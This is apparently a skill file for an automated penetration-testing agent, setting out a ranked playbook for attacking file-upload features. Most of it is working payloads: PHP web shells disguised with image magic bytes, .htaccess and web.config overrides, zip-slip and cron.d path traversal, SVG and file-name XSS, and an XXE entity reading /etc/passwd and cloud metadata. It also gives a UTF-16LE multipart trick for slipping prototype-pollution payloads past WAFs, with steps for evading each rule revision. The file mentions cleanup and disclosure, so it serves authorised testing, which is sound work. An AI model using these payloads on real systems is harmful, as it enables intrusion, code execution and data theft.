# Moraa — File upload attacks

> Load on any upload (avatar, attachment, import, logo, document, media). Goal ranked: **RCE (web
> shell)** > stored XSS/SVG > SSRF/XXE via parser > path traversal (overwrite) > DoS. Deep ref
> `knowledge/*/skills/web/file-upload`.

## Recon the upload
```
- What's accepted (ext/MIME/magic)? Where does it land (web-root? CDN? S3?)? Is the URL returned/guessable?
- Is it re-processed (image resize, PDF/thumbnail, antivirus, EXIF strip)? Processing = SSRF/RCE surface.
```

## Web shell / code exec (if it lands in web-root & executes)
```
double ext:      shell.php.jpg  shell.jpg.php  shell.php%00.jpg  shell.php.  shell.php;.jpg
alt extensions:  .phtml .php3 .php4 .php5 .php7 .pht .phar (PHP) ; .asp .aspx .cshtml ; .jsp .jspx ; .cgi .pl
content-type spoof:  Content-Type: image/jpeg  on a .php body
magic bytes:     prepend GIF89a; / valid JPEG header before <?php system($_GET[c]);?>
config override:  upload .htaccess (AddType application/x-httpd-php .jpg) then a .jpg shell (Apache)
                  web.config (IIS) ; .user.ini (auto_prepend_file) for PHP
polyglot:        valid image + appended PHP (AddType/handler dependent)
archive:         zip-slip → path traversal on extract (../../var/www/shell.php) ; symlink in tar/zip
```

## Stored XSS / client-side
```
SVG with <script>alert(document.domain)</script> (served inline, not as attachment)
HTML/XHTML upload served with text/html ; filename XSS "><img src=x onerror=alert(1)>.jpg
PDF with JS ; SVG use xlink:href=javascript: ; EXIF/metadata XSS reflected in a gallery
Content-Disposition inline vs attachment matters — inline SVG/HTML = XSS.
```

## SSRF / XXE / LFI via parser
```
SVG → XXE: <!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]> ... &x;   (also http://169.254.169.254)
image/pdf converter (ImageMagick "ImageTragick", Ghostscript) → RCE/SSRF/file-read
DOCX/XLSX (are zips) → XXE in the XML parts ; "fetch image from URL" field → SSRF (ssrf.md)
video/thumbnailer (ffmpeg) → SSRF/file-read via crafted playlist (SSRF via .m3u8/HLS)
```

## Path traversal / overwrite
```
filename ../../../../etc/cron.d/x  or  ..\..\ (Windows) ; overwrite config/other users' files
absolute path filename /var/www/html/shell.php ; null byte / unicode dot bypass of sanitizer
```

## Bypass validators
```
- allowlist by ext → double ext / case (.PhP) / trailing dot-space / unicode.
- MIME check → spoof Content-Type; magic-byte check → prepend valid header.
- image re-encode strips payload → put payload in EXIF/comment that survives, or attack the encoder itself.
- size/rate limits ; second-order (upload benign, then change ext via a rename/move API).
- filename allowlist on the plain filename= value only → RFC 2231: filename*=utf-8''shell.php ;
  MIME-B64 filename: filename="=?utf-8?b?c2hlbGwucGhw?="
```

## Busboy/Undici UTF-16LE multipart charset bypass (Node.js/Next.js — the $100k CVE-chain pattern)
Next.js' Busboy multipart parser falls through UTF-16 charset aliases (`utf16le`/`utf-16le`/`ucs2`/
`ucs-2`) and decodes that PART as UTF-16LE. A WAF inspecting raw bytes sees null-byte-padded garbage
and misses the payload; Busboy decodes it correctly — including `__proto__`/`:constructor` keys a
byte-level WAF rule was blocking.
```http
--boundary
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

<UTF-16LE-encoded payload — e.g. __proto__/:constructor prototype-pollution JSON>
--boundary--
```
WAF-rule evolution to expect (test each if the first attempt is blocked): a rule that skips parts
with a `filename=` present → add `filename=` to the payload part's Content-Disposition; a rule that
blocks any non-utf-8 charset → switch to the Undici/FormData request path instead of multipart
(Undici ignores per-part charset); a rule matching `__proto__`/`:constructor` in the decoded body →
split the payload across two form fields. See `prototype-pollution.md` for the escalation once the
payload lands.

## Method
Map accept + landing + processing → try RCE first (web-root+exec), else SVG/HTML XSS, else parser
SSRF/XXE, else traversal. Confirm by fetching/triggering the file. → `validate.md` → `findings/`
(show the shell output or the fired XSS/SSRF). Clean up any uploaded shells; note them for disclosure.
